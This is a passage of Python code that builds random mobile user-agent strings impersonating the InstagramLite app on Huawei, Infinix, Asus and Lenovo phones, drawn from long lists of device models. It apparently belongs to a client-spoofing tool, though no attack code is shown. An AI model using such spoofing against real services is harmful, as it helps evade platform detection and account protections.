'PAR-AL00', 'PAR-LX9', 'PAR-AL00', 'ANE-AL00', 'INE-LX2', 'INE-LX2r', 'VCE-L22', 'VCE-TL00', 'VCE-AL00', 'VCE-AL00', 'VCE-AL00', 'MAR-AL00', 'MAR-AL00', 'MAR-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'GLK-AL00', 'GLK-TL00', 'GLK-TL00', 'GLK-LX1U', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'SPN-TL00', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JEF-TN00', 'JEF-NX9', 'JEF-AN20', 'JEF-AN00', 'JEF-AN20', 'JEF-AN00', 'JER-AN20', 'JER-AN10', 'JER-TN10', 'JER-AN10', 'JER-AN10', 'JER-AN20', 'JER-AN10', 'CDL-AN50', 'CDY-NX9B', 'CDY-AN00', 'CDY-AN00', 'JNY-LX2', 'ANG-LX2', 'ANG-LX1', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'CHL-AL60', 'CHL-AL60', 'NEN-LX1', 'NEN-L22', 'NAM-LX9', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'JLN-LX1', 'JLN-LX3', '608HW', 'PRA-LX2', 'PRA-LX3', 'HUAWEI MLA-L11', 'DIG-L01', 'WAS-AL00', 'FIG-LX1', 'FIG-LX2', 'FIG-LX3', 'POT-LX1', 'POT-LX3', 'POT-LX2J', 'POT-LX1AF', 'POT-LX1T', 'PPA-LX2', 'PPA-LX1', 'P Smart S', 'STK-LX1', 'MZ-STK-LX1', 'VTR-L09', 'VTR-L29', 'VTR-AL00', 'WAS-LX1A', 'WAS-TL10', 'VKY-AL00', 'VKY-L09', 'VKY-L29', 'BAC-L23', 'HUAWEI P11', 'EML-L09', 'EML-L29', 'EML-AL00', 'EML-AL00', 'EML-L29', 'ANE-LX1', 'ANE-LX2', 'ANE-LX3', 'ANE-LX2J', 'CLT-L29', 'CLT-AL00', 'CLT-L09', 'CLT-L04', 'CLT-AL00', 'ELE-AL00', 'ELE-L09', 'ELE-AL00', 'ELE-L29', 'ELE-L04', 'ELE-AL00', 'MAR-LX1A', 'MAR-LX1M', 'MAR-LX1A', 'MAR-LX2', 'MAR-LX3A', 'MAR-LX1B', 'VOG-AL10', 'VOG-L29', 'VOG-L09', 'HUAWEI P30PRO', 'ANA-LX4', 'JNY-LX1', 'ART-L29', 'ART-L29N', 'ELS-NX9', 'ELS-AN00', 'ELS-AN00', 'ELS-AN00', 'ELS-AN10', 'ELS-AN10', 'ELS-N39', 'ELS-AN10', 'ABR-LX9', 'ABR-AL00', 'Huawei P50', 'ABR-AL00', 'BAL-L49', 'BAL-AL00', 'JAD-AL50', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL60', 'ABR-AL60', 'HUAWEI P6-U06', 'HUAWEI P6s', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI GRA-L09', 'HUAWEI GRA-UL00', 'ALE-L21', 'ALE-L23', 'ALE-L21', 'ALE-L21', 'PRA-LX1', 'PRA-LA1', 'HUAWEI P8max', 'HUAWEI GRA-UL10', 'HUAWEI-P8Lite', 'HUAWEI-P8Lite', 'EVA-L09', 'EVA-DL00', 'EVA-L19', 'EVA-AL00', 'EVA-AL10', 'HUAWEI VNS-L31', 'HUAWEI VNS-L21', 'HUAWEI VNS-L22', 'SLA-L22', 'SLA-L02', 'HUAWEI VNS-L52', 'HUAWEI VNS-L52', 'DIG-L03', 'DIG-L23', 'VIE-L29', 'VIE-L09', 'VIE-AL10', 'VIE-AL10', 'SM-A336B', 'SM-A536E', 'M2101K6R', 'SM-A307G', 'SM-A528B', 'LM-K200', '2201116SG', 'SM-A107M', 'CPH2239', 'SM-A205G', 'M2004J19C', 'M2102J20SG', 'SM-A336M', 'SM-A127M', 'SM-G975U', 'SM-A730F', 'SM-G950F', 'M2007J20CG', 'T671E', 'HUAWEI_Q201', 'Huawei S7', 'HUAWEI-S7', 'HUAWEI-S7', 'HUAWEI-S7', 'S8600', 'S8600', 'S8600', 'HUAWEI S9', 'HUAWEI ATH-UL01', 'HUAWEI ATH-UL06', 'KANT-360', 'KANT-360S', 'LEO-BX9', 'LEO-DLXXE', 'HUAWEI T1 7.0', 'B988', 'ZT-10013G', 'B988', 'B988', 'HUAWEI T8100', 'HUAWEI T8500', 'HUAWEI T8600', 'T8620', 'T8620', 'T8620', 'T8830Pro', 'T8830Pro', 'T8830Pro', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8833', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8950', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'HUAWEI_T8951', 'HUAWEI_T8951', 'HUAWEI T8951', 'HUAWEI T8951', 'T9200', 'T9200', 'T9200', 'HUAWEI-U20', 'HUAWEI U8120', 'U8180', 'U8180', 'U8180', 'MegaFon U8180', 'Kyivstar Terra', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8180', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8185', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8186', 'U8230', 'U8220/U8230', 'HuaweiU8300', 'U8350', 'U8350', 'GM FOX', 'U8350', 'Barcelona', 'U8350', 'U8350', 'U8350', 'U8350', 'U8350-51', 'U8350', 'U8350', 'U8350', 'U8350-51', 'Personal U8350', 'U8350', 'U8350', 'U8350', 'U8350', 'MF8503', 'ICE', 'MF8503', 'MF8503', 'HuaweiU8500', 'HuaweiU8510', 'S41HW', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'U8600', 'Huawei u8650', 'Huawei u8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650-1', 'U8650-1', 'U8650', 'MTC 955', 'U8650', 'U8650', 'U8650-1', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'U8650', 'Prism', 'Prism', 'Prism', 'U8651T', 'Prism', 'U8651T', 'U8651T', 'Prism', 'U8652', 'Huawei-U8652', 'U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Huawei-U8652', 'Android 2.3.5', 'U8655-51', 'U8655-1', 'U8655-1', 'U8655-1', 'MTC 965', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'U8655-1', 'Etisalat', 'U8655-1', 'U8655-1', 'U8655-51', 'U8655-1', 'U8660', 'SONIC', 'HUAWEI U8661', 'HUAWEI_U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'HUAWEI U8661', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'Huawei-U8665', 'GT-19100', 'U8666-1', 'U8666-1', 'U8666-1', 'MTC Fit', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-51', 'U8666-1', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-51', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'U8666-1', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666E', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'HUAWEI U8666N', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'U8667', 'T-MobilemyTouch', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'HUAWEI U8681', 'Prism II', 'Prism II', 'Prism II', 'Prism II', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Huawei-U8687', 'Ucell', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8800Pro', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8812D', 'U8815-51', 'U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'HUAWEI U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'U8815', 'Galaxy S5', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'HUAWEI U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'U8815N', 'MTC Viva', 'HUAWEI U8816', 'U8816', 'MTC Viva', 'U8816', 'U8816', 'U8820', 'U8820', 'U8820', 'U8820', 'U8820', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'HUAWEI_U8825D', 'HUAWEI U8825D', 'HUAWEI U8825D', 'U8832D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'U8836D', 'HUAWEI-U8850', 'U8860-51', 'HUAWEI_U8860', 'U8867Z', 'U8867Z', 'U8867Z', 'Huawei U8900', 'HUAWEI U8950', 'HUAWEI U8950D', 'Oppo F9D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8950D', 'HUAWEI U8951', 'Huawei-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'HUAWEI-U9000', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', 'U9200E', '201HW', '201HW', '201HW', '201HW', 'U9500E', 'HW-01E', 'HW-01E', 'HW-01E', 'HW-01E', 'HUAWEI U9510', 'Huawei/U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI_U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'HUAWEI U9510E', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'GL07S', 'UM840', 'UM840', 'UM840', 'KANT-359', 'KANT-369', 'HUAWEI WATCH', 'ARS-L22', 'ARS-TL00', 'ARS-AL00', 'ARS-L22', 'Huawei Y221', 'Huawei y221', 'Huawei Y3 2017', 'CRO-U00', 'CRO-L22', 'CAG-L02', 'CAG-L22', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI_Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'HUAWEI Y300C', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A1', 'Huawei Y301A2', 'Huawei Y301A2', 'Huawei Y301A2', 'HuaweiY301A2', 'Huawei Y320', 'Huawei Y320', 'Huawei Y320', 'Huawei Y330', 'Huawei Y330', 'HUAWEI Y330-U01', 'HUAWEI Y336-U02', 'Huawei Y360', 'HUAWEI Y360', 'HUAWEI LUA-L21', 'HUAWEI LUA-U22', 'MYA-L22', 'MYA-L23', 'MYA-U29', 'DRA-L21', 'DRA-LX3', 'DRA-L01', 'U', 'AMN-LX9', 'AMN-LX2', 'AMN-LX3', 'HUAWEI AMN-LX9', 'AMN-LX1', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'DRA-LX5', 'CRO-L23', 'CRO-L03', 'CRO-L03', 'CAG-L03', 'CAG-L23', 'DRA-LX2', 'MYA-L13', 'HUAWEI Y511', 'Huawei Y520', 'HUAWEI Y520', 'HUAWEI Y536A1', 'HUAWEI Y550', 'HUAWEIY560', 'Huawei Y5C', 'HUAWEI CUN-L22', 'HUAWEI CUN-U29', 'HUAWEI CUN-L21', 'HUAWEI CUN-L01', 'DRA-LX9', 'DRA-LX9', 'DRA-LX9', 'HUAWEI SCL-U31', 'HUAWEI SCC-U21', 'MYA-L11', 'MYA-L41', 'ATU-L22', 'ATU-L21', 'MRD-LX3', 'MRD-LX1', 'MRD-LX1F', 'MRD-LX1N', 'MRD-LX3', 'ATU-L31', 'TIT-L01', 'HUAWEI TIT-L01', 'HUAWEI TIT-AL00', 'MRD-LX2', 'Kavak Y625-U03', 'Y635-L03', 'Y635-L01', 'HUAWEI Y635-L03', 'Y635-L02', 'Y635-L21', 'Y635-L21', 'CAM-L21', 'HUAWEI CAM-L21', 'CAM-L23', 'CAM-L03', 'MED-LX9', 'MED-LX9N', 'H1711z', 'TRT-LX3', 'TRT-LX1', 'LDN-L01', 'LDN-LX3', 'LDN-L01', 'DUB-LX3', 'DUB-LX1', 'LDN-L21', 'LDN-L21', 'LDN-L21', 'TRT-L21A', 'LDN-LX2', 'DUB-LX2', 'DUB-AL20', 'PPA-LX3', 'Peppa-L23B', 'ART-L28', 'AQM-LX1', 'AQM-LX1', 'FLA-LX3', 'FLA-LX2', 'FLA-LX1', 'FLA-AL20', 'FLA-TL10', 'JKM-LX1', 'JKM-LX2', 'JKM-AL00b', 'JKM-AL00a', 'JKM-LX3', 'STK-L21', 'STK-L22', 'STK-LX3', 'FRL-L23', 'FRL-L22', 'FRL-L22'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; HUAWEI; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Infinix':
                    self.android_version = random.choice(['12', '11', '9'])
                    self.device_model = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; INFINIX MOBILITY LIMITED/Infinix; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Asus':
                    self.android_version = random.choice(['9', '10'])
                    self.device_model = random.choice(['ME171', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'Slider SL101', 'ME371MG', 'K01N', 'K012', 'K00E', 'K019', 'K00Z', 'K00Z', 'K016', 'K016', 'K00G', 'K00G', 'K50IJ', 'ME172V', 'ME172V', 'ME172V', 'ME172V', 'K00F', 'K01E', 'K00R', 'K017', 'K013', 'K007', 'K01A', 'ASUS MeMO Pad 7', 'K015', 'K011', 'K00L', 'ME302C', 'ME302C', 'ME302C', 'AOSP on Duma', 'ME302KL', 'ME302KL', 'K00U', 'ME173X', 'ME173X', 'ME173X', 'ME173X', 'ASUS K00S', 'ME301T', 'ME301T', 'ME301T', 'PadFone', 'PadFone', 'PadFone 2', 'PadFone 2', 'PadFone T008', 'PadFone T008', 'PadFone T004', 'ASUS_T00E', 'PadFone T00C', 'Padfone t00c', 'PadFone T00C', 'ASUS_T00N', 'ASUS PadFone X', 'ASUS_T00T', 'ASUS_Z01QD', 'ZS600KL', 'ASUS_I001DE', 'ZS660KL', 'ASUS_I001DA', 'ASUS_I001DC', 'ZS660KL', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I003DD', 'ZS661KS', 'ASUS_I005DA', 'ASUS_I005DC', 'ASUS_AI2201_C', 'ASUS_AI2201_D', 'ASUS_AI2201_F', 'ASUS_AI2203_D', 'ASUS_AI2203_C', 'ASUS_AI2203_B', 'ASUS TAB A8', 'Tinker Board', 'Tinker Board 2', 'Tinker Board S', 'TX201LA', 'TX201LA', 'K010', 'K018', 'K018', 'TF300T', 'ASUS Pad TF300T', 'K01B', 'K00C', 'K00C', 'ASUS XPad 10LTE', 'ASUS Z101', 'ASUS Z101 Prime', 'ASUS_Z008D', 'ASUS_Z00AD', 'Z00D', 'ASUS_Z00LD', 'ASUS_Z00ED', 'ASUS_Z00RD', 'ASUS ZenFone 2E', 'ASUS_Z012D', 'ZE520KL', 'ASUS_Z017D', 'ASUS_Z012DA', 'ASUS_Z017DA', 'ASUS_Z012S', 'ASUS_Z012DE', 'ASUS_Z01FD', 'ASUS_Z016S', 'ZS550KL', 'ASUS_Z01BD', 'ASUS_Z01BS', 'ZC551KL', 'ASUS_Z01BDB', 'ASUS_X00DDB', 'ASUS_X008D', 'ASUS_X00DDA', 'ZC553KL', 'ASUS_X008DB', 'ASUS_A001', 'ASUS_Z01HDA', 'ZE553KL', 'ASUS_X00LD', 'ASUS_Z01KDA', 'ASUS_Z01KS', 'ASUS_X00LDB', 'ASUS_T00I', 'ASUS_X00HD', 'ASUS_X00ID', 'ZC554KL', 'ASUS_X015D', 'ASUS_X015D', 'ASUS_Z01GS', 'ASUS_Z01GD', 'ASUS_X00LDA', 'ZD553KL', 'ASUS_Z01MD', 'ASUS_Z01MDA', 'ZD552KL', 'ASUS_X00QD', 'ASUS_X00QD', 'ASUS_T00J', 'ASUS_X00QSA', 'ZE620KL', 'ASUS_T00F', 'ASUS_T00F', 'ASUS_T00K', 'ASUS_X017DA', 'ASUS_T00P', 'ASUS_Z01RD', 'ASUS_Z01RD', 'Zenfone 5Z', 'ZS620KL', 'ASUS_T00G', 'ASUS_I01WD', 'ASUS_T00G', 'ASUS_Z002', 'ZS630KL', 'ASUS_I002D', 'ZS670KS', 'ZS671KS', 'ASUS_I006D', 'ASUS_I004D', 'ASUS_AI2202', 'ASUS_AI2202_B', 'ASUS_A002', 'ASUS_A002A', 'ASUS_Z007', 'ASUS_X00ADA', 'ASUS_X00BD', 'ASUS_X007D', 'ZB500KL', 'ASUS_Z00SD', 'ZB551KL', 'ASUS_L001', 'ZB500KG', 'ASUS_Z00VD', 'ASUS_X013DA', 'ASUS_X013D', 'ASUS_X014D', 'ASUS_X014D', 'ASUS_X013DB', 'G550KL', 'G550KL', 'G553KL', 'ASUS_Z00YD', 'ASUS_A007', 'ASUS_X00RD', 'G552KL', 'ASUS_Z010DD', 'ASUS_Z010DB', 'ASUS_Z010D', 'ASUS_Z010DA', 'ASUS_X00PD', 'ZB555KL', 'ASUS_X01AD', 'ZB633KL', 'ASUS_X018D', 'ASUS_X018DC', 'ASUS_X00TD', 'ASUS_X00TDB', 'ASUS_X00TDE', 'ZB602KL', 'ASUS_X01BDA', 'ASUS_A001D', 'ASUS_X002', 'ASUS_X003', 'ASUS_X003', 'ASUS_X550', 'ASUS_X00GD', 'ASUS_X005', 'ASUS_Z00UDB', 'ASUS_Z00UD', 'ASUS_A006', 'ASUS_A009', 'ASUS_Z00XS', 'P01T_1', 'P021', 'P00L', 'P00C', 'P028', 'P027', 'ASUS_P00I', 'P001', 'P008', 'ASUS_P00J', 'ASUS ZenWatch', 'ASUS ZenWatch 2'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; asus; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Lenovo':
                    self.android_version = random.choice(['11', '10'])
                    self.device_model = random.choice(['lenovo1023', 'Lenovo 1023', 'Lenovo 3056', 'Lenovo 3300A', 'Lenovo 76S', 'Lenovo 8389', 'Lenovo A 319', 'Lenovo A1010a20', 'Lenovo A1000', 'IdeaTabA1000L-F', 'Lenovo A1000', 'Lenovo-A101', 'Lenovo A1900', 'Lenovo A2010l36', 'Lenovo_a2010', 'Lenovo A2010l36/S100', 'Lenovo A2016b31', 'A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2107', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2580', 'Lenovo-A269i/S001', 'id Lenovo_A269i', 'Lenovo A2860', 'Lenovo A288t', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo A308t', 'Lenovo A316', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo_A318t', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A320t', 'Lenovo A328', 'Lenovo A328t', 'Lenovo A328', 'Lenovo A330e', 'Lenovo A330e', 'Lenovo A338T', 'Lenovo A338t', 'Lenovo A355e', 'Lenovo A358t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A368t', 'Lenovo A3690', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'id Lenovo_A369i', 'Lenovo A378t', 'Lenovo A378t', 'Lenovo A3860', 'Lenovo A388t', 'Lenovo A3900', 'Lenovo A3910t30', 'Lenovo A396', 'Lenovo A398t', 'Lenovo A399', 